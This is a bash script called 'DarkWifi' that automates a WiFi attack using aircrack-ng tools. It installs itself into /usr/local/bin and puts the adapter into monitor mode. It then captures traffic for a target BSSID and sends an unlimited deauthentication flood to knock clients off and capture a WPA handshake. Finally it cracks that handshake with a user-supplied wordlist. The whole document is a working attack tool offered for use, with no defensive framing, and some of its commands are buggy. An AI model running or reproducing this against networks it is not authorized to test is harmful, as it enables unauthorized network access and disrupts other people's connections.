#!/bin/bash

tool_name="DarkWifi"
install_dir="/usr/local/bin"
cp "$0" "$install_dir/$tool_name"

chmod +x "$install_dir/$tool_name" 
 
red1='\e[31m'
green='\033[0;32m'
nc='\033[0m'
blue='\e[34m'
i=1
clear

echo -ne -n "${blue}--------------------------------------------------\n${nc}"
echo -ne -n "${blue}--------------------------------------------------\n${nc}"
echo -ne -n "${blue}--------------------------------------------------\n${nc}"
echo -ne -n "${red1}------------ This tool by Ahmed Tamer ------------\n${nc}"
echo -ne -n "${blue}--------------------------------------------------\n${nc}"
echo -ne -n "${blue}--------------------------------------------------\n${nc}"
echo -ne -n "${blue}--------------------------------------------------\n${nc}"

echo -ne "click enter to continue"
read -s

clear

com=$(iwconfig)
echo "$com"

echo -ne  "${blue}Enter your wireless Adapter name :${nc}"

read ad

clear

monitor_interface="${ad}"

if iwconfig 2>&1 | grep -q "$monitor_interface"; then
    echo -ne "${green}Monitor mode interface $monitor_interface exists.${nc}"
else
    echo -ne "${red1}This adapter cant use the tool.${nc}"
    exit 1
fi

sleep 1

clear

airmon-ng start "$com"

sleep 1

clear

airmon-ng check kill

sleep 1 

clear

gnome-terminal --title="Airodump-ng search for network" -- bash -c "airodump-ng $ad; exec bash"


echo -ne "${blue}Enter the MAC-ADDRESS of the network:${nc} "
read bssid

echo -ne "${blue}Enter the channel of the network:${nc} "
read channel

echo -ne "${blue}Enter the place that will save the cap file + name of file (example = /home/kali/Desktop/hack1 :)(caution : change the name of the cap file when its use one time ago ) :${nc}"

read dic

gnome-terminal --tab --title="Airodump-ng Output" -- bash -c "airodump-ng $ad -w $dic -c $channel --bssid $bssid; exec bash"

gnome-terminal --tab --title="attacking the network" -- bash -c "aireplay-ng --deauth 0 -a $bssid $ad"

echo -ne "${blue}Waiting for WPA handshake capture. Press Enter when you get it:${nc} "
read -s

clear

echo -ne "${blue}Enter the dic of the wordlist that you want to use :"

read word

sleep 1

dic2="${dic}-01.cap"

aircrack-ng "$dic2"  -w  "$word"


